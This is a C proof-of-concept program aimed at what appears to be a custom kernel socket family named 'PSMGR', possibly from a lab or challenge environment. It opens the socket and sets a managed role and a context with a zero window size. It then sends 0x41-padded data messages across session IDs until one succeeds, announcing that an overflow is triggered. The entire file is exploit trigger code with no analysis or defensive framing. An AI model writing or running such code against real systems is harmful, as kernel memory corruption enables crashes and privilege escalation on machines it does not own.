#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>

#define AF_PSMGR 46
#define PSMGR_SOL 282
#define PSMGR_OPT_SET_ROLE 1
#define PSMGR_OPT_LOCAL_CTX 4
#define PSMGR_ROLE_MANAGED 0x01
#define PSMGR_XFRM_WINDOW 0x02
#define PSMGR_MODE_LINEAR 0x01
#define PSMGR_MSG_DATA 0x05

struct psmgr_local_ctx { uint8_t xfrm_type; uint8_t enc_mode; uint16_t window_sz; uint32_t proc_param; };

int main(void) {
    int fd;
    struct psmgr_local_ctx ctx;
    uint8_t role = PSMGR_ROLE_MANAGED;
    uint8_t buf[24];
    ssize_t ret;
    /* Try session_ids 1 through 10 */
    int sid;

    printf("step 1: socket\n"); fflush(stdout);
    fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd < 0) { printf("socket failed: %d %s\n", errno, strerror(errno)); return 1; }
    printf("socket ok fd=%d\n", fd); fflush(stdout);

    printf("step 2: set role MANAGED\n"); fflush(stdout);
    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) {
        printf("set_role failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    printf("set_role ok\n"); fflush(stdout);

    printf("step 3: set LOCAL_CTX\n"); fflush(stdout);
    memset(&ctx, 0, sizeof(ctx));
    ctx.xfrm_type = PSMGR_XFRM_WINDOW;
    ctx.enc_mode = PSMGR_MODE_LINEAR;
    ctx.window_sz = 0;
    ctx.proc_param = 127;
    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_LOCAL_CTX, &ctx, sizeof(ctx)) < 0) {
        printf("local_ctx failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    printf("local_ctx ok - ESTABLISHED\n"); fflush(stdout);

    /* Try each possible session_id */
    for (sid = 1; sid <= 16; sid++) {
        printf("step 4: trying session_id_lo=%d\n", sid); fflush(stdout);
        memset(buf, 0, sizeof(buf));
        buf[0] = PSMGR_MSG_DATA;
        buf[1] = sid & 0xff;
        buf[2] = 16; buf[3] = 0;
        buf[4] = 1; buf[5] = 0; buf[6] = 0; buf[7] = 0;
        memset(buf + 8, 0x41, 16);

        ret = write(fd, buf, sizeof(buf));
        if (ret >= 0) {
            printf("write ok sid=%d ret=%zd — overflow triggered!\n", sid, ret);
            fflush(stdout);
            close(fd);
            return 0;
        }
        if (errno != 77) { /* not EBADFD */
            printf("write sid=%d failed: %d %s\n", sid, errno, strerror(errno));
        }
    }
    printf("no session_id worked\n"); fflush(stdout);
    close(fd);
    return 0;
}

